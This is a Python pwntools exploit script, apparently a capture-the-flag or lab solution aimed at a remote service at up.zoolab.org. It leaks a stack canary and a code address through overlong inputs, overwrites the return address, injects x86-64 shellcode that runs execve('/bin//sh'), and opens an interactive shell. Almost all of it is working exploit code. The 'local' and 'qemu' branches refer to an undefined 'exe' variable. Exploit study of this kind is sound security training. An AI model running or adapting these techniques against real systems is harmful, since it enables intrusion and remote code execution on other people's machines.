#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

# elf = ELF('./shellcode')
# off_main = elf.symbols[b'main']
# base = 0
# qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', 10259)

# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (40)

r.recvuntil(b"name? ")
payload = b'A' * 41
r.send(payload)
response = r.recvline().split(b'A' * 41)[1][:7].rstrip(b'\n')
print(response)
canary = b'\x00' + response
print(canary)

r.recvuntil(b"number? ")
payload = b'A' * 56
r.send(payload)
response = r.recvline().split(b'A' * 56)[1][:8].rstrip(b'\n')
print(response)
addr = u64(response.ljust(8, b'\x00'))
print(addr)
msg_addr = addr - 0x8b07 + 0xd31e0
msg_addr = p64(msg_addr)

r.recvuntil(b"name? ")
payload = b'A' * 40
# zero = b'0'
rbp = b'A' * 8
r.send(payload + canary + rbp + msg_addr)

r.recvuntil(b"Leave your message: ")
shellcode = """
    xor rax, rax
    push rax
    mov rsi, rsp

    push rax
    mov rdx, rsp

    mov rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp

    mov rax, 0x3b
    syscall
"""
binary = asm(shellcode)
r.send(binary)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
